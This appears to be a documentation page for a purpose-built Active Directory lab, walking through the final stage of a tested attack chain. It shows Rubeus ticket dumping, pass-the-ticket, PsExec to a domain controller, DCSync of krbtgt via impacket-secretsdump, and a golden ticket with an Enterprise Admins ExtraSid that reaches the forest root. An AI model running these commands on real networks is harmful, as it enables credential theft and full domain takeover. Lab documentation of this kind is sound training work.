# Apexfiend — Full Attack Chain (CA02 → DC02 → DCSync → DC01)

## 1. Purpose

This document continues from `rbcd-path.md`: local administrative access on `CA02`. It narrates the confirmed, tested final stage of the attack path — reaching a Domain Admin identity, performing DCSync, and extending compromise to the forest root (`DC01`) via SID History. It also closes out `docs/08-attack-paths/` as the last document in this folder.

## 2. Correcting the Design: No Second Certificate Abuse Was Needed

**`00-overview/attack-path.md`, Stage 13 anticipated a second ESC8/certificate-abuse step against `CA02` to obtain a Domain Admin certificate. That step did not happen — and was not necessary.** From local `Administrator` on `CA02`, a Rubeus ticket triage (the same technique already used on `MSSQL03` and `WK04` earlier in this path) was run:

```text
Invoke-Rubeus 'triage'
```

This surfaced a **live, cached TGT belonging to `m.alvarez`** — present in LSASS because he has, at some point, logged onto `CA02` interactively as its PKI/CA administrator. `net user m.alvarez /domain` confirms his role and group membership:

```text
Comment:                 PKI Administrator
Global Group memberships: *Domain Users  *Domain Admins
```

His ticket is dumped directly (`Invoke-Rubeus 'dump /luid:... /service:krbtgt /nowrap'`) and later pass-the-ticket'd into a session on `WK01` (local administrative rights on a non-domain-joined `CA02` are not themselves useful for reaching a domain controller — a domain-joined foothold is needed, which `WK01` already provides). **This replaces the design's anticipated certificate-abuse step with a simpler, already-proven technique**: finding and reusing a privileged administrator's own cached credentials on a box they're known to log into. `attack-path.md` should be updated to reflect this.

## 3. Reaching DC02 as m.alvarez

With `m.alvarez`'s ticket imported on `WK01`, `\\dc02\c$` is reachable, and `PsExec64.exe` provides command execution:

```text
whoami:    corp\m.alvarez
hostname:  DC02
IP:        172.16.20.100
```

## 4. Confirming the Trust Relationship

From `DC02`, as `m.alvarez`, the forest structure is re-confirmed directly:

```powershell
Get-ADTrust -Filter * -Server DC02
# → apexfiend.lab, BiDirectional, Uplevel, ForestTransitive: False (the standard intra-forest trust, matching 02-active-directory/domains.md)

Get-ADForest | Select -ExpandProperty Domains | % { Get-ADDomainController -Filter * -Server $_ }
# → DC01.apexfiend.lab (192.168.10.10), DC02 + DC03 (corp.apexfiend.lab)

(Get-ADDomain).DomainSID.Value
# → S-1-5-21-3364994804-235286439-3869108742   (corp.apexfiend.lab)

(Get-ADGroup -Identity "Enterprise Admins" -Server "apexfiend.lab").SID.Value
# → S-1-5-21-1844321796-1565884869-590183023-519   (root domain's Enterprise Admins)
```

Both SIDs are exactly what's needed for the SID History forgery described in `02-active-directory/kerberos.md`, Section 4 and `00-overview/attack-path.md`, Stage 15.

## 5. DCSync

`m.alvarez`'s own Domain Admin membership is sufficient to perform DCSync directly — no additional privilege escalation is needed at this point:

```text
impacket-secretsdump -dc-ip <DC02-IP> 'corp.apexfiend.lab/m.alvarez'@<DC02-IP> -just-dc-user 'corp/krbtgt'
```

```text
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NT hash redacted>:::
krbtgt:aes256-cts-hmac-sha1-96:<redacted>
krbtgt:aes128-cts-hmac-sha1-96:<redacted>
```

The child domain's `krbtgt` key material is recovered in full — the keys needed to forge arbitrary Kerberos tickets for `corp.apexfiend.lab`, including ones carrying forged SID History.

## 6. Golden Ticket with SID History — ExtraSid into the Forest Root

```text
Invoke-Rubeus 'golden /rc4:<krbtgt RC4> /domain:corp.apexfiend.lab /sid:S-1-5-21-3364994804-235286439-3869108742 /sids:S-1-5-21-1844321796-1565884869-590183023-519 /user:Administrator /nowrap'
```

A TGT is forged for `Administrator@corp.apexfiend.lab`, using the recovered `krbtgt` key to sign a PAC that includes an **ExtraSid**: the root domain's `Enterprise Admins` SID. Because `corp.apexfiend.lab`'s intra-forest trust to `apexfiend.lab` does not apply SID filtering (`02-active-directory/domains.md`, Section 5 — `SIDFilteringQuarantined: False`, standard default behavior for intra-forest trusts), the root domain accepts this extra group membership at face value.

The resulting ticket is converted to `.kirbi` and imported (`ptt`) into a session on `CA02` (as `m.alvarez`, already authenticated there from Section 3's broader access).

## 7. Reaching DC01 — Forest Compromise

```text
klist → Client: Administrator @ CORP.APEXFIEND.LAB, carrying the forged ExtraSid
ls \\dc01\c$ → succeeds
```

```text
PsExec64.exe \\dc01 cmd
whoami:    corp\administrator
hostname:  DC01
IP:        192.168.10.10
```

**This completes `00-overview/attack-path.md`, Stage 15 (ExtraSid / SID History abuse).** The session's client principal remains `corp\Administrator` (the ticket was forged for the child domain, not the root), but the forged `Enterprise Admins` SID from the root domain grants it administrative rights on `DC01` itself — confirmed by the successful `PsExec` execution. The entire two-domain forest is now compromised.

## 8. Full Chain Summary

```text
(see initial-access.md through rbcd-path.md for the full preceding chain)
                 │
                 ▼
CA02 — local Administrator
      │  Rubeus triage → m.alvarez's own cached TGT found (no 2nd cert abuse needed)
      ▼
WK01 session — pass-the-ticket as m.alvarez
      │  PsExec to DC02
      ▼
DC02 — corp\m.alvarez (Domain Admin)
      │  trust/SID enumeration
      │  DCSync — krbtgt key material recovered
      ▼
Golden Ticket, forged with root-domain Enterprise Admins ExtraSid
      │  /ptt
      ▼
DC01 — corp\administrator (with root-domain Enterprise Admin rights)
      = Full forest compromise
```

## 9. Validation Status

| Item | Status |
|---|---|
| Ticket triage recovering `m.alvarez`'s cached credentials on `CA02` | Tested and confirmed — **replaces** the design's anticipated 2nd certificate-abuse step |
| Pass-the-ticket to `DC02` as `m.alvarez` | Tested and confirmed |
| Trust/SID enumeration from `DC02` | Tested and confirmed |
| DCSync recovering `krbtgt` | Tested and confirmed |
| Golden Ticket with ExtraSid, forged and injected | Tested and confirmed |
| Access to `DC01` with root-domain Enterprise Admin rights | Tested and confirmed — full chain validated end-to-end |

## 10. Related Documentation

- `rbcd-path.md` — Precedes this document; ends with local admin on `CA02`
- `02-active-directory/domains.md`, `kerberos.md` — The trust configuration this stage depends on
- `00-overview/attack-path.md` — Stages 13–15; Stage 13's description needs updating per Section 2 above
- `writeups/` *(pending)* — Full raw transcripts for every stage, to be compiled from the source material already provided across this folder
- `09-reporting/` *(pending)* — The professional report synthesizing this entire chain
